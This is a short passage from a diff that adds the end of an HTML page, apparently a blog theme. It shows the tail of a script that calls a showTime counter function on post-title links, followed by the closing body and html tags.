+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
